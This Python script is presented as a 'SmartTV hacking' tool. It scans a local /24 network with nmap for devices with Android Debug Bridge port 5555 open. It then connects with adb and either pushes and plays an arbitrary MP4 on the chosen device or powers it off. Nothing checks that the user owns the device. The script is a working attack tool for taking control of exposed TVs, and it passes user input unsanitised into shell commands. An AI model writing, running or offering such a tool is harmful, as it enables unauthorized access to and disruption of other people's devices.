import subprocess
import os
from colorama import Fore, Style, init
from pyfiglet import figlet_format
import sys

# Initialize colorama
init(autoreset=True)

def execute_command(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    return process.returncode, output.decode(), error.decode()

def scan_and_select_device():
    print(Fore.YELLOW + Style.BRIGHT + " [*] Scanning network for devices with open port 5555...")
    scan_code, scan_output, scan_error = execute_command("nmap -p 5555 --open -oG - 192.168.1.0/24 | grep 'Host:' | awk '{print $2}'")

    if scan_code == 0 and scan_output:
        devices = scan_output.strip().split("\n")
        if devices:
            print(Fore.YELLOW + Style.BRIGHT + f" [+] Found {len(devices)} device(s) with port 5555 open.")
            for idx, device in enumerate(devices, 1):
                print(Fore.YELLOW + Style.BRIGHT + f" [+] {idx}.({device})")

            target_index = int(input(Fore.YELLOW + Style.BRIGHT + " [*] Select the device number to connect: ")) - 1
            if 0 <= target_index < len(devices):
                return devices[target_index]
            else:
                print(Fore.YELLOW + Style.BRIGHT + " [-] Invalid selection.")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " [-] No devices found with port 5555 open.")
    else:
        print(Fore.YELLOW + Style.BRIGHT + " [-] Error scanning the network.")
        print(Fore.YELLOW + Style.BRIGHT + " [!] Nmap output:", scan_error.strip())

    return None

def main():
    os.system("clear")
    print(Fore.YELLOW + Style.BRIGHT + figlet_format("  Smart TV Tool"))
    print(Fore.YELLOW + Style.BRIGHT + """                                                        Created by Syntax

      SmartTV hacking screen for need port(5555) open!

      [1] Execute MP4 format
      [2] Power off
      [3] Exit

    """)

    selection = input(Fore.YELLOW + Style.BRIGHT + " [*] selection: ")

    if selection == "1":
        targetip = scan_and_select_device()
        if targetip:
            connect_code, connect_output, connect_error = execute_command("adb connect " + targetip)
            if connect_code == 0 and "unable to connect" not in connect_output.lower() and "cannot connect to" not in connect_error.lower():
                print(Fore.YELLOW + Style.BRIGHT + " [*] Connection..")
                print(Fore.YELLOW + Style.BRIGHT + " [+] connected!")

                targetfile = input(Fore.YELLOW + Style.BRIGHT + " [*] upload mp4 file: ")
                push_code, push_output, push_error = execute_command("adb push " + targetfile + " /storage/emulated/0/")
                if push_code == 0:
                    targetfilename = os.path.basename(targetfile)
                    view_code, view_output, view_error = execute_command("adb shell am start -a android.intent.action.VIEW -d file:///storage/emulated/0/" + targetfilename + " -t video/*")
                    if view_code == 0:
                        print(Fore.YELLOW + Style.BRIGHT + " [+] Sent successfully!")
                    else:
                        print(Fore.YELLOW + Style.BRIGHT + " [-] error launching video viewer")
                        print(Fore.YELLOW + Style.BRIGHT + " [!] ADB output:", view_error.strip())
                else:
                    print(Fore.YELLOW + Style.BRIGHT + " [-] error pushing file to device")
                    print(Fore.YELLOW + Style.BRIGHT + " [!] ADB output:", push_error.strip())
            else:
                print(Fore.YELLOW + Style.BRIGHT + " [-] error connecting to the device, please make sure ADB is installed and the device is accessible")
                print(Fore.YELLOW + Style.BRIGHT + " [!] ADB output:", connect_output.strip(), connect_error.strip())

    elif selection == "2":
        targetip = scan_and_select_device()
        if targetip:
            connect_code, connect_output, connect_error = execute_command("adb connect " + targetip)
            if connect_code == 0 and "unable to connect" not in connect_output.lower() and "cannot connect to" not in connect_error.lower():
                print(Fore.YELLOW + Style.BRIGHT + " [*] Connection..")
                print(Fore.YELLOW + Style.BRIGHT + " [+] connected!")
                power_off_code, power_off_output, power_off_error = execute_command("adb shell reboot -p")
                if power_off_code == 0:
                    print(Fore.YELLOW + Style.BRIGHT + " [+] Powering off!")
                else:
                    print(Fore.YELLOW + Style.BRIGHT + " [-] Error powering off")
                    print(Fore.YELLOW + Style.BRIGHT + " [!] ADB output:", power_off_error.strip())
            else:
                print(Fore.YELLOW + Style.BRIGHT + " [-] error connecting to the device, please make sure ADB is installed and the device is accessible")
                print(Fore.YELLOW + Style.BRIGHT + " [!] ADB output:", connect_output.strip(), connect_error.strip())

    elif selection == "3":
        print(Fore.YELLOW + Style.BRIGHT + "[!] exiting..")
        sys.exit()

    else:
        print(Fore.YELLOW + Style.BRIGHT + "[!] invalid selection, exiting..")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + Style.BRIGHT + "\n[!] ctrl-c detected! exiting..")
        sys.exit()
